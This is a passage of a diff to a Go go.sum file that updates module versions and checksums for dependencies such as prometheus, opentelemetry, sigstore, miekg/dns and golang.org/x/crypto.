v1.5.0/go.mod h1:pFxgyoBC7bSaBwPgfKdkLd5X25qrDl4LWUI2bnpBCr8=\n github.com/kisielk/gotool v1.0.0/go.mod h1:XhKaO+MFFWcvkIS/tQcRk01m1F5IRFswLeQ+oQHNcck=\n-github.com/klauspost/compress v1.17.4 h1:Ej5ixsIri7BrIjBkRZLTo6ghwrEtHFk7ijlczPW4fZ4=\n-github.com/klauspost/compress v1.17.4/go.mod h1:/dCuZOvVtNoHsyb+cuJD3itjs3NbnF6KH9zAO4BDxPM=\n+github.com/klauspost/compress v1.17.9 h1:6KIumPrER1LHsvBVuDa0r5xaG0Es51mhhB9BQB2qeMA=\n+github.com/klauspost/compress v1.17.9/go.mod h1:Di0epgTjJY877eYKx5yC51cX2A2Vl2ibi7bDH9ttBbw=\n github.com/kr/pretty v0.1.0/go.mod h1:dAy3ld7l9f0ibDNOQOHHMYYIIbhfbHSm3C4ZsoJORNo=\n github.com/kr/pretty v0.3.1 h1:flRD4NNwYAUpkphVc1HcthR4KEIFJ65n8Mw5qdRn3LE=\n github.com/kr/pretty v0.3.1/go.mod h1:hoEshYVHaxMs3cyo3Yncou5ZscifuDolrwPKZanG3xk=\n\n@@ -546,8 +468,8 @@\ngithub.com/kr/text v0.2.0 h1:5Nx0Ya0ZqY2ygV366QzturHI13Jq95ApcVaJBhpS+AY=\n github.com/kr/text v0.2.0/go.mod h1:eLer722TekiGuMkidMxC/pM04lWEeraHUUmBw8l2grE=\n github.com/kylelemons/godebug v1.1.0 h1:RPNrshWIDI6G2gRW9EHilWtl7Z6Sb1BR0xunSBf0SNc=\n github.com/kylelemons/godebug v1.1.0/go.mod h1:9/0rRGxNHcop5bhtWyNeEfOS8JIWk580+fNqagV/RAw=\n-github.com/letsencrypt/boulder v0.0.0-20231026200631-000cd05d5491 h1:WGrKdjHtWC67RX96eTkYD2f53NDHhrq/7robWTAfk4s=\n-github.com/letsencrypt/boulder v0.0.0-20231026200631-000cd05d5491/go.mod h1:o158RFmdEbYyIZmXAbrvmJWesbyxlLKee6X64VPVuOc=\n+github.com/letsencrypt/boulder v0.0.0-20240620165639-de9c06129bec h1:2tTW6cDth2TSgRbAhD7yjZzTQmcN25sDRPEeinR51yQ=\n+github.com/letsencrypt/boulder v0.0.0-20240620165639-de9c06129bec/go.mod h1:TmwEoGCwIti7BCeJ9hescZgRtatxRE+A72pCoPfmcfk=\n github.com/magiconair/properties v1.8.7 h1:IeQXZAiQcpL9mgcAe1Nu6cX9LLw6ExEHKjN0VQdvPDY=\n github.com/magiconair/properties v1.8.7/go.mod h1:Dhd985XPs7jluiymwWYZ0G4Z61jb3vdS329zhj2hYo0=\n github.com/mailru/easyjson v0.7.7 h1:UGYAvKxe3sBsEDzO8ZeWOSlIQfWFlxbzLZe7hwFURr0=\n\n@@ -556,9 +478,8 @@\ngithub.com/mattn/go-colorable v0.1.13 h1:fFA4WZxdEF4tXPZVKMLwD8oUnCTTo08duU7wxec\n github.com/mattn/go-colorable v0.1.13/go.mod h1:7S9/ev0klgBDR4GtXTXX8a3vIGJpMovkB8vQcUbaXHg=\n github.com/mattn/go-isatty v0.0.20 h1:xfD0iDuEKnDkl03q4limB+vH+GxLEtL/jb4xVJSWWEY=\n github.com/mattn/go-isatty v0.0.20/go.mod h1:W+V8PltTTMOvKvAeJH7IuucS94S2C6jfK/D7dTCTo3Y=\n-github.com/matttproud/golang_protobuf_extensions v1.0.1/go.mod h1:D8He9yQNgCq6Z5Ld7szi9bcBfOoFv/3dc6xSMkL2PC0=\n-github.com/miekg/dns v1.1.57 h1:Jzi7ApEIzwEPLHWRcafCN9LZSBbqQpxjt/wpgvg7wcM=\n-github.com/miekg/dns v1.1.57/go.mod h1:uqRjCRUuEAA6qsOiJvDd+CFo/vW+y5WR6SNmHE55hZk=\n+github.com/miekg/dns v1.1.58 h1:ca2Hdkz+cDg/7eNF6V56jjzuZ4aCAE+DbVkILdQWG/4=\n+github.com/miekg/dns v1.1.58/go.mod h1:Ypv+3b/KadlvW9vJfXOTf300O4UqaHFzFCuHz+rPkBY=\n github.com/miekg/pkcs11 v1.0.3-0.20190429190417-a667d056470f/go.mod h1:XsNlhZGX73bx86s2hdc/FuaLm2CPZJemRLMA+WTFxgs=\n github.com/miekg/pkcs11 v1.1.1 h1:Ugu9pdy6vAYku5DEpVWVFPYnzV+bxB+iRdbuFSu7TvU=\n github.com/miekg/pkcs11 v1.1.1/go.mod h1:XsNlhZGX73bx86s2hdc/FuaLm2CPZJemRLMA+WTFxgs=\n\n@@ -579,7 +500,6 @@\ngithub.com/mozillazg/docker-credential-acr-helper v0.3.0 h1:DVWFZ3/O8BP6Ue3iS/Ol\n github.com/mozillazg/docker-credential-acr-helper v0.3.0/go.mod h1:cZlu3tof523ujmLuiNUb6JsjtHcNA70u1jitrrdnuyA=\n github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 h1:C3w9PqII01/Oq1c1nUAm88MOHcQC9l5mIlSMApZMrHA=\n github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822/go.mod h1:+n7T8mK8HuQTcFwEeznm/DIxMOiR9yIdICNftLE1DvQ=\n-github.com/mwitkow/go-conntrack v0.0.0-20190716064945-2f068394615f/go.mod h1:qRWi+5nqEBWmkhHvq77mSJWrCKwh8bxhgT7d/eI7P4U=\n github.com/niemeyer/pretty v0.0.0-20200227124842-a10e7caefd8e/go.mod h1:zD1mROLANZcx1PVRCS0qkT7pwLkGfwJo4zjcN/Tysno=\n github.com/notaryproject/notation-core-go v1.0.2 h1:VEt+mbsgdANd9b4jqgmx2C7U0DmwynOuD2Nhxh3bANw=\n github.com/notaryproject/notation-core-go v1.0.2/go.mod h1:2HkQzUwg08B3x9oVIztHsEh7Vil2Rj+tYgxH+JObLX4=\n\n@@ -588,8 +508,9 @@\ngithub.com/notaryproject/notation-go v1.0.1/go.mod h1:VonyZsbocRQQNIDq/VPV5jKJOQ\n github.com/nozzle/throttler v0.0.0-20180817012639-2ea982251481 h1:Up6+btDp321ZG5/zdSLo48H9Iaq0UQGthrhWC6pCxzE=\n github.com/nozzle/throttler v0.0.0-20180817012639-2ea982251481/go.mod h1:yKZQO8QE2bHlgozqWDiRVqTFlLQSj30K/6SAK8EeYFw=\n github.com/nxadm/tail v1.4.4/go.mod h1:kenIhsEOeOJmVchQTgglprH7qJGnHDVpk1VPCcaMI8A=\n-github.com/nxadm/tail v1.4.8 h1:nPr65rt6Y5JFSKQO7qToXr7pePgD6Gwiw05lkbyAQTE=\n github.com/nxadm/tail v1.4.8/go.mod h1:+ncqLTQzXmGhMZNUePPaPqPvBxHAIsmXswZKocGu+AU=\n+github.com/nxadm/tail v1.4.11 h1:8feyoE3OzPrcshW5/MJ4sGESc5cqmGkGCWlco4l0bqY=\n+github.com/nxadm/tail v1.4.11/go.mod h1:OTaG3NK980DZzxbRq6lEuzgU+mug70nY11sMd4JXXHc=\n github.com/oklog/ulid v1.3.1 h1:EGfNDEx6MqHz8B3uNV6QAib1UR2Lm97sHi3ocA6ESJ4=\n github.com/oklog/ulid v1.3.1/go.mod h1:CirwcVhetQ6Lv90oh/F+FBtV6XMibvdAFo93nm5qn4U=\n github.com/oleiade/reflections v1.0.1 h1:D1XO3LVEYroYskEsoSiGItp9RUxG6jWnCVvrqH0HHQM=\n\n@@ -612,8 +533,8 @@\ngithub.com/open-policy-agent/cert-controller v0.8.0 h1:pao3WCLsKGz5dSWSlNUFrNFQd\n github.com/open-policy-agent/cert-controller v0.8.0/go.mod h1:alotCQRwX4M6VEwEgO53FB6nGLSlvah6L0pWxSRslIk=\n github.com/open-policy-agent/frameworks/constraint v0.0.0-20230411224310-3f237e2710fa h1:1r6gnPhbsswSIem/Fa11fKo/MhjijzvqSxWIu+3HQeY=\n github.com/open-policy-agent/frameworks/constraint v0.0.0-20230411224310-3f237e2710fa/go.mod h1:nrGEsNJ9LyQa68eqwV6snwCc7pbkvwUJLPZlq6zz6Fs=\n-github.com/open-policy-agent/opa v0.63.0 h1:ztNNste1v8kH0/vJMJNquE45lRvqwrM5mY9Ctr9xIXw=\n-github.com/open-policy-agent/opa v0.63.0/go.mod h1:9VQPqEfoB2N//AToTxzZ1pVTVPUoF2Mhd64szzjWPpU=\n+github.com/open-policy-agent/opa v0.68.0 h1:Jl3U2vXRjwk7JrHmS19U3HZO5qxQRinQbJ2eCJYSqJQ=\n+github.com/open-policy-agent/opa v0.68.0/go.mod h1:5E5SvaPwTpwt2WM177I9Z3eT7qUpmOGjk1ZdHs+TZ4w=\n github.com/opencontainers/go-digest v1.0.0 h1:apOUWs51W5PlhuyGyz9FCeeBIOUDA/6nW8Oi/yOhh5U=\n github.com/opencontainers/go-digest v1.0.0/go.mod h1:0JzlMkj0TRzQZfJkVvzbP0HBR3IKzErnv2BNG4W4MAM=\n github.com/opencontainers/image-spec v1.1.0 h1:8SG7/vwALn54lVB/0yZ/MMwhFrPYtpEHQb2IpWsCzug=\n\n@@ -635,23 +556,19 @@\ngithub.com/pkg/errors v0.9.1/go.mod h1:bwawxfHBFNV+L2hUp1rHADufV3IMtnDRdf1r5NINE\n github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=\n github.com/pmezard/go-difflib v1.0.1-0.20181226105442-5d4384ee4fb2 h1:Jamvg5psRIccs7FGNTlIRMkT8wgtp5eCXdBlqhYGL6U=\n github.com/pmezard/go-difflib v1.0.1-0.20181226105442-5d4384ee4fb2/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=\n-github.com/prometheus/client_golang v1.12.2 h1:51L9cDoUHVrXx4zWYlcLQIZ+d+VXHgqnYKkIuq4g/34=\n-github.com/prometheus/client_golang v1.12.2/go.mod h1:3Z9XVyYiZYEO+YQWt3RD2R3jrbd179Rt297l4aS6nDY=\n+github.com/prometheus/client_golang v1.20.2 h1:5ctymQzZlyOON1666svgwn3s6IKWgfbjsejTMiXIyjg=\n+github.com/prometheus/client_golang v1.20.2/go.mod h1:PIEt8X02hGcP8JWbeHyeZ53Y/jReSnHgO035n//V5WE=\n github.com/prometheus/client_model v0.0.0-20190812154241-14fe0d1b01d4/go.mod h1:xMI15A0UPsDsEKsMN9yxemIoYk6Tm2C1GtYGdfGttqA=\n-github.com/prometheus/client_model v0.2.0/go.mod h1:xMI15A0UPsDsEKsMN9yxemIoYk6Tm2C1GtYGdfGttqA=\n-github.com/prometheus/client_model v0.6.0 h1:k1v3CzpSRUTrKMppY35TLwPvxHqBu0bYgxZzqGIgaos=\n-github.com/prometheus/client_model v0.6.0/go.mod h1:NTQHnmxFpouOD0DpvP4XujX3CdOAGQPoaGhyTchlyt8=\n-github.com/prometheus/common v0.32.1/go.mod h1:vu+V0TpY+O6vW9J44gczi3Ap/oXXR10b+M/gUGO4Hls=\n-github.com/prometheus/common v0.51.1 h1:eIjN50Bwglz6a/c3hAgSMcofL3nD+nFQkV6Dd4DsQCw=\n-github.com/prometheus/common v0.51.1/go.mod h1:lrWtQx+iDfn2mbH5GUzlH9TSHyfZpHkSiG1W7y3sF2Q=\n-github.com/prometheus/procfs v0.7.3/go.mod h1:cz+aTbrPOrUb4q7XlbU9ygM+/jj0fzG6c1xBZuNvfVA=\n-github.com/prometheus/procfs v0.12.0 h1:jluTpSng7V9hY0O2R9DzzJHYb2xULk9VTR1V1R/k6Bo=\n-github.com/prometheus/procfs v0.12.0/go.mod h1:pcuDEFsWDnvcgNzo4EEweacyhjeA9Zk3cnaOZAZEfOo=\n+github.com/prometheus/client_model v0.6.1 h1:ZKSh/rekM+n3CeS952MLRAdFwIKqeY8b62p8ais2e9E=\n+github.com/prometheus/client_model v0.6.1/go.mod h1:OrxVMOVHjw3lKMa8+x6HeMGkHMQyHDk9E3jmP2AmGiY=\n+github.com/prometheus/common v0.55.0 h1:KEi6DK7lXW/m7Ig5i47x0vRzuBsHuvJdi5ee6Y3G1dc=\n+github.com/prometheus/common v0.55.0/go.mod h1:2SECS4xJG1kd8XF9IcM1gMX6510RAEL65zxzNImwdc8=\n+github.com/prometheus/procfs v0.15.1 h1:YagwOFzUgYfKKHX6Dr+sHT7km/hxC76UB0learggepc=\n+github.com/prometheus/procfs v0.15.1/go.mod h1:fB45yRUv8NstnjriLhBQLuOUt+WW4BsoGhij/e3PBqk=\n github.com/protocolbuffers/txtpbfmt v0.0.0-20231025115547-084445ff1adf h1:014O62zIzQwvoD7Ekj3ePDF5bv9Xxy0w6AZk0qYbjUk=\n github.com/protocolbuffers/txtpbfmt v0.0.0-20231025115547-084445ff1adf/go.mod h1:jgxiZysxFPM+iWKwQwPR+y+Jvo54ARd4EisXxKYpB5c=\n github.com/rcrowley/go-metrics v0.0.0-20201227073835-cf1acfcdf475 h1:N/ElC8H3+5XpJzTSTfLsJV/mx9Q9g7kxmchpfZyxgzM=\n github.com/rcrowley/go-metrics v0.0.0-20201227073835-cf1acfcdf475/go.mod h1:bCqnVzQkZxMG4s8nGwiZ5l3QUCyqpo9Y+/ZMZ9VjZe4=\n-github.com/rogpeppe/go-internal v1.3.0/go.mod h1:M8bDsm7K2OlrFYOpmOWEs/qY81heoFRclV5y23lUDJ4=\n github.com/rogpeppe/go-internal v1.12.0 h1:exVL4IDcn6na9z1rAb56Vxr+CgyK3nn3O+epU5NdKM8=\n github.com/rogpeppe/go-internal v1.12.0/go.mod h1:E+RYuTGaKKdloAfM02xzb0FW3Paa99yedzYV+kq4uf4=\n github.com/russross/blackfriday/v2 v2.1.0/go.mod h1:+Rmxgy9KzJVeS9/2gXHxylqXiyQDYRxCVz55jmeOWTM=\n\n@@ -677,8 +594,8 @@\ngithub.com/sigstore/fulcio v1.4.5 h1:WWNnrOknD0DbruuZWCbN+86WRROpEl3Xts+WT2Ek1yc\n github.com/sigstore/fulcio v1.4.5/go.mod h1:oz3Qwlma8dWcSS/IENR/6SjbW4ipN0cxpRVfgdsjMU8=\n github.com/sigstore/rekor v1.3.6 h1:QvpMMJVWAp69a3CHzdrLelqEqpTM3ByQRt5B5Kspbi8=\n github.com/sigstore/rekor v1.3.6/go.mod h1:JDTSNNMdQ/PxdsS49DJkJ+pRJCO/83nbR5p3aZQteXc=\n-github.com/sigstore/sigstore v1.8.3 h1:G7LVXqL+ekgYtYdksBks9B38dPoIsbscjQJX/MGWkA4=\n-github.com/sigstore/sigstore v1.8.3/go.mod h1:mqbTEariiGA94cn6G3xnDiV6BD8eSLdL/eA7bvJ0fVs=\n+github.com/sigstore/sigstore v1.8.6 h1:g066b/Nw5r5oxhNv4XqJUUzVcyf1b07itUueiQe7rZM=\n+github.com/sigstore/sigstore v1.8.6/go.mod h1:UOBrJd9JBQ81DrkpGljzsIFXEtfC30raHvLWFWG857U=\n github.com/sigstore/sigstore/pkg/signature/kms/aws v1.8.3 h1:LTfPadUAo+PDRUbbdqbeSl2OuoFQwUFTnJ4stu+nwWw=\n github.com/sigstore/sigstore/pkg/signature/kms/aws v1.8.3/go.mod h1:QV/Lxlxm0POyhfyBtIbTWxNeF18clMlkkyL9mu45y18=\n github.com/sigstore/sigstore/pkg/signature/kms/azure v1.8.3 h1:xgbPRCr2npmmsuVVteJqi/ERw9+I13Wou7kq0Yk4D8g=\n\n@@ -776,16 +693,14 @@\ngithub.com/ysmood/fetchup v0.2.3 h1:ulX+SonA0Vma5zUFXtv52Kzip/xe7aj4vqT5AJwQ+ZQ=\n github.com/ysmood/fetchup v0.2.3/go.mod h1:xhibcRKziSvol0H1/pj33dnKrYyI2ebIvz5cOOkYGns=\n github.com/ysmood/goob v0.4.0 h1:HsxXhyLBeGzWXnqVKtmT9qM7EuVs/XOgkX7T6r1o1AQ=\n github.com/ysmood/goob v0.4.0/go.mod h1:u6yx7ZhS4Exf2MwciFr6nIM8knHQIE22lFpWHnfql18=\n-github.com/ysmood/got v0.34.1 h1:IrV2uWLs45VXNvZqhJ6g2nIhY+pgIG1CUoOcqfXFl1s=\n-github.com/ysmood/got v0.34.1/go.mod h1:yddyjq/PmAf08RMLSwDjPyCvHvYed+WjHnQxpH851LM=\n+github.com/ysmood/got v0.40.0 h1:ZQk1B55zIvS7zflRrkGfPDrPG3d7+JOza1ZkNxcc74Q=\n+github.com/ysmood/got v0.40.0/go.mod h1:W7DdpuX6skL3NszLmAsC5hT7JAhuLZhByVzHTq874Qg=\n github.com/ysmood/gson v0.7.3 h1:QFkWbTH8MxyUTKPkVWAENJhxqdBa4lYTQWqZCiLG6kE=\n github.com/ysmood/gson v0.7.3/go.mod h1:3Kzs5zDl21g5F/BlLTNcuAGAYLKt2lV5G8D1zF3RNmg=\n github.com/ysmood/leakless v0.8.0 h1:BzLrVoiwxikpgEQR0Lk8NyBN5Cit2b1z+u0mgL4ZJak=\n github.com/ysmood/leakless v0.8.0/go.mod h1:R8iAXPRaG97QJwqxs74RdwzcRHT1SWCGTNqY8q0JvMQ=\n-github.com/yuin/goldmark v1.1.25/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=\n github.com/yuin/goldmark v1.1.27/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=\n github.com/yuin/goldmark v1.1.30/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=\n-github.com/yuin/goldmark v1.1.32/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=\n github.com/yuin/goldmark v1.2.1/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=\n github.com/yuin/goldmark v1.4.13/go.mod h1:6yULJ656Px+3vBD8DxQVa3kxgyrAnzto9xy5taEt/CY=\n github.com/zalando/go-keyring v0.2.3 h1:v9CUu9phlABObO4LPWycf+zwMG7nlbb3t/B5wa97yms=\n\n@@ -795,35 +710,30 @@\ngithub.com/zeebo/errs v1.3.0 h1:hmiaKqgYZzcVgRL1Vkc1Mn2914BbzB0IBxs+ebeutGs=\n github.com/zeebo/errs v1.3.0/go.mod h1:sgbWHsvVuTPHcqJJGQ1WhI5KbWlHYz+2+2C/LSEtCw4=\n go.mongodb.org/mongo-driver v1.14.0 h1:P98w8egYRjYe3XDjxhYJagTokP/H6HzlsnojRgZRd80=\n go.mongodb.org/mongo-driver v1.14.0/go.mod h1:Vzb0Mk/pa7e6cWw85R4F/endUC3u0U9jGcNU603k65c=\n-go.opencensus.io v0.21.0/go.mod h1:mSImk1erAIZhrmZN+AvHh14ztQfjbGwt4TtuofqLduU=\n-go.opencensus.io v0.22.0/go.mod h1:+kGneAE2xo2IficOXnaByMWTGM9T73dGwxeWcUqIpI8=\n-go.opencensus.io v0.22.2/go.mod h1:yxeiOL68Rb0Xd1ddK5vPZ/oVn4vY4Ynel7k9FzqtOIw=\n-go.opencensus.io v0.22.3/go.mod h1:yxeiOL68Rb0Xd1ddK5vPZ/oVn4vY4Ynel7k9FzqtOIw=\n-go.opencensus.io v0.22.4/go.mod h1:yxeiOL68Rb0Xd1ddK5vPZ/oVn4vY4Ynel7k9FzqtOIw=\n go.opencensus.io v0.24.0 h1:y73uSU6J157QMP2kn2r30vwW1A2W2WFwSCGnAVxeaD0=\n go.opencensus.io v0.24.0/go.mod h1:vNK8G9p7aAivkbmorf4v+7Hgx+Zs0yY+0fOtgBfjQKo=\n-go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.49.0 h1:4Pp6oUg3+e/6M4C0A/3kJ2VYa++dsWVTtGgLVj5xtHg=\n-go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.49.0/go.mod h1:Mjt1i1INqiaoZOMGR1RIUJN+i3ChKoFRqzrRQhlkbs0=\n-go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.49.0 h1:jq9TW8u3so/bN+JPT166wjOI6/vQPF6Xe7nMNIltagk=\n-go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.49.0/go.mod h1:p8pYQP+m5XfbZm9fxtSKAbM6oIllS7s2AfxrChvc7iw=\n-go.opentelemetry.io/otel v1.24.0 h1:0LAOdjNmQeSTzGBzduGe/rU4tZhMwL5rWgtp9Ku5Jfo=\n-go.opentelemetry.io/otel v1.24.0/go.mod h1:W7b9Ozg4nkF5tWI5zsXkaKKDjdVjpD4oAt9Qi/MArHo=\n-go.opentelemetry.io/otel/exporters/otlp/otlptrace v1.22.0 h1:9M3+rhx7kZCIQQhQRYaZCdNu1V73tm4TvXs2ntl98C4=\n-go.opentelemetry.io/otel/exporters/otlp/otlptrace v1.22.0/go.mod h1:noq80iT8rrHP1SfybmPiRGc9dc5M8RPmGvtwo7Oo7tc=\n-go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc v1.21.0 h1:tIqheXEFWAZ7O8A7m+J0aPTmpJN3YQ7qetUAdkkkKpk=\n-go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc v1.21.0/go.mod h1:nUeKExfxAQVbiVFn32YXpXZZHZ61Cc3s3Rn1pDBGAb0=\n-go.opentelemetry.io/otel/exporters/prometheus v0.39.0 h1:whAaiHxOatgtKd+w0dOi//1KUxj3KoPINZdtDaDj3IA=\n-go.opentelemetry.io/otel/exporters/prometheus v0.39.0/go.mod h1:4jo5Q4CROlCpSPsXLhymi+LYrDXd2ObU5wbKayfZs7Y=\n-go.opentelemetry.io/otel/metric v1.24.0 h1:6EhoGWWK28x1fbpA4tYTOWBkPefTDQnb8WSGXlc88kI=\n-go.opentelemetry.io/otel/metric v1.24.0/go.mod h1:VYhLe1rFfxuTXLgj4CBiyz+9WYBA8pNGJgDcSFRKBco=\n-go.opentelemetry.io/otel/sdk v1.24.0 h1:YMPPDNymmQN3ZgczicBY3B6sf9n62Dlj9pWD3ucgoDw=\n-go.opentelemetry.io/otel/sdk v1.24.0/go.mod h1:KVrIYw6tEubO9E96HQpcmpTKDVn9gdv35HoYiQWGDFg=\n-go.opentelemetry.io/otel/sdk/metric v0.39.0 h1:Kun8i1eYf48kHH83RucG93ffz0zGV1sh46FAScOTuDI=\n-go.opentelemetry.io/otel/sdk/metric v0.39.0/go.mod h1:piDIRgjcK7u0HCL5pCA4e74qpK/jk3NiUoAHATVAmiI=\n-go.opentelemetry.io/otel/trace v1.24.0 h1:CsKnnL4dUAr/0llH9FKuc698G04IrpWV0MQA/Y1YELI=\n-go.opentelemetry.io/otel/trace v1.24.0/go.mod h1:HPc3Xr/cOApsBI154IU0OI0HJexz+aw5uPdbs3UCjNU=\n-go.opentelemetry.io/proto/otlp v1.0.0 h1:T0TX0tmXU8a3CbNXzEKGeU5mIVOdf0oykP+u2lIVU/I=\n-go.opentelemetry.io/proto/otlp v1.0.0/go.mod h1:Sy6pihPLfYHkr3NkUbEhGHFhINUSI/v80hjKIs5JXpM=\n+go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.52.0 h1:vS1Ao/R55RNV4O7TA2Qopok8yN+X0LIP6RVWLFkprck=\n+go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc v0.52.0/go.mod h1:BMsdeOxN04K0L5FNUBfjFdvwWGNe/rkmSwH4Aelu/X0=\n+go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.53.0 h1:4K4tsIXefpVJtvA/8srF4V4y0akAoPHkIslgAkjixJA=\n+go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.53.0/go.mod h1:jjdQuTGVsXV4vSs+CJ2qYDeDPf9yIJV23qlIzBm73Vg=\n+go.opentelemetry.io/otel v1.28.0 h1:/SqNcYk+idO0CxKEUOtKQClMK/MimZihKYMruSMViUo=\n+go.opentelemetry.io/otel v1.28.0/go.mod h1:q68ijF8Fc8CnMHKyzqL6akLO46ePnjkgfIMIjUIX9z4=\n+go.opentelemetry.io/otel/exporters/otlp/otlptrace v1.28.0 h1:3Q/xZUyC1BBkualc9ROb4G8qkH90LXEIICcs5zv1OYY=\n+go.opentelemetry.io/otel/exporters/otlp/otlptrace v1.28.0/go.mod h1:s75jGIWA9OfCMzF0xr+ZgfrB5FEbbV7UuYo32ahUiFI=\n+go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc v1.28.0 h1:R3X6ZXmNPRR8ul6i3WgFURCHzaXjHdm0karRG/+dj3s=\n+go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc v1.28.0/go.mod h1:QWFXnDavXWwMx2EEcZsf3yxgEKAqsxQ+Syjp+seyInw=\n+go.opentelemetry.io/otel/exporters/prometheus v0.49.0 h1:Er5I1g/YhfYv9Affk9nJLfH/+qCCVVg1f2R9AbJfqDQ=\n+go.opentelemetry.io/otel/exporters/prometheus v0.49.0/go.mod h1:KfQ1wpjf3zsHjzP149P4LyAwWRupc6c7t1ZJ9eXpKQM=\n+go.opentelemetry.io/otel/metric v1.28.0 h1:f0HGvSl1KRAU1DLgLGFjrwVyismPlnuU6JD6bOeuA5Q=\n+go.opentelemetry.io/otel/metric v1.28.0/go.mod h1:Fb1eVBFZmLVTMb6PPohq3TO9IIhUisDsbJoL/+uQW4s=\n+go.opentelemetry.io/otel/sdk v1.28.0 h1:b9d7hIry8yZsgtbmM0DKyPWMMUMlK9NEKuIG4aBqWyE=\n+go.opentelemetry.io/otel/sdk v1.28.0/go.mod h1:oYj7ClPUA7Iw3m+r7GeEjz0qckQRJK2B8zjcZEfu7Pg=\n+go.opentelemetry.io/otel/sdk/metric v1.27.0 h1:5uGNOlpXi+Hbo/DRoI31BSb1v+OGcpv2NemcCrOL8gI=\n+go.opentelemetry.io/otel/sdk/metric v1.27.0/go.mod h1:we7jJVrYN2kh3mVBlswtPU22K0SA+769l93J6bsyvqw=\n+go.opentelemetry.io/otel/trace v1.28.0 h1:GhQ9cUuQGmNDd5BTCP2dAvv75RdMxEfTmYejp+lkx9g=\n+go.opentelemetry.io/otel/trace v1.28.0/go.mod h1:jPyXzNPg6da9+38HEwElrQiHlVMTnVfM3/yv2OlIHaI=\n+go.opentelemetry.io/proto/otlp v1.3.1 h1:TrMUixzpM0yuc/znrFTP9MMRh8trP93mkCiDVeXrui0=\n+go.opentelemetry.io/proto/otlp v1.3.1/go.mod h1:0X1WI4de4ZsLrrJNLAQbFeLCm3T7yBkR0XqQ7niQU+8=\n go.step.sm/crypto v0.44.2 h1:t3p3uQ7raP2jp2ha9P6xkQF85TJZh+87xmjSLaib+jk=\n go.step.sm/crypto v0.44.2/go.mod h1:x1439EnFhadzhkuaGX7sz03LEMQ+jV4gRamf5LCZJQQ=\n go.uber.org/atomic v1.11.0 h1:ZvwS0R+56ePWxUNi+Atn9dWONBPp/AUETXlHW0DxSjE=\n\n@@ -835,8 +745,6 @@\ngo.uber.org/multierr v1.11.0/go.mod h1:20+QtiLqy0Nd6FdQB9TLXag12DsQkrbs3htMFfDN8\n go.uber.org/zap v1.27.0 h1:aJMhYGrd5QSmlpLMr2MftRKl7t8J8PTZPA732ud/XR8=\n go.uber.org/zap v1.27.0/go.mod h1:GB2qFLM7cTU87MWRP2mPIjqfIDnGu+VIO4V/SdhGo2E=\n golang.org/x/crypto v0.0.0-20190308221718-c2843e01d9a2/go.mod h1:djNgcEr1/C05ACkg1iLfiJU5Ep61QUkGW8qpdssI0+w=\n-golang.org/x/crypto v0.0.0-20190510104115-cbcb75029529/go.mod h1:yigFU9vqHzYiE8UmvKecakEJjdnWj3jj499lnFckfCI=\n-golang.org/x/crypto v0.0.0-20190605123033-f99c8df09eb5/go.mod h1:yigFU9vqHzYiE8UmvKecakEJjdnWj3jj499lnFckfCI=\n golang.org/x/crypto v0.0.0-20191011191535-87dc89f01550/go.mod h1:yigFU9vqHzYiE8UmvKecakEJjdnWj3jj499lnFckfCI=\n golang.org/x/crypto v0.0.0-20191219195013-becbf705a915/go.mod h1:LzIPMQfyMNhhGPhUkYOs5KpL4U8rLKemX1yGLhDgUto=\n golang.org/x/crypto v0.0.0-20200510223506-06a226fb4e37/go.mod h1:LzIPMQfyMNhhGPhUkYOs5KpL4U8rLKemX1yGLhDgUto=\n\n@@ -851,38 +759,14 @@\ngolang.org/x/crypto v0.7.0/go.mod h1:pYwdfH91IfpZVANVyUOhSIPZaFoJGxTFbZhFTx+dXZU\n golang.org/x/crypto v0.10.0/go.mod h1:o4eNf7Ede1fv+hwOwZsTHl9EsPFO6q6ZvYR8vYfY45I=\n golang.org/x/crypto v0.13.0/go.mod h1:y6Z2r+Rw4iayiXXAIxJIDAJ1zMW4yaTpebo8fPOliYc=\n golang.org/x/crypto v0.19.0/go.mod h1:Iy9bg/ha4yyC70EfRS8jz+B6ybOBKMaSxLj6P6oBDfU=\n-golang.org/x/crypto v0.24.0 h1:mnl8DM0o513X8fdIkmyFE/5hTYxbwYOjDS/+rK6qpRI=\n-golang.org/x/crypto v0.24.0/go.mod h1:Z1PMYSOR5nyMcyAVAIQSKCDwalqy85Aqn1x3Ws4L5DM=\n+golang.org/x/crypto v0.32.0 h1:euUpcYgM8WcP71gNpTqQCn6rC2t6ULUPiOzfWaXVVfc=\n+golang.org/x/crypto v0.32.0/go.mod h1:ZnnJkOaASj8g0AjIduWNlq2NRxL0PlBrbKVyZ6V/Ugc=\n golang.org/x/exp v0.0.0-20190121172915-509febef88a4/go.mod h1:CJ0aWSM057203Lf6IL+f9T1iT9GByDxfZKAQTCR3kQA=\n-golang.org/x/exp v0.0.0-20190306152737-a1d7652674e8/go.mod h1:CJ0aWSM057203Lf6IL+f9T1iT9GByDxfZKAQTCR3kQA=\n-golang.org/x/exp v0.0.0-20190510132918-efd6b22b2522/go.mod 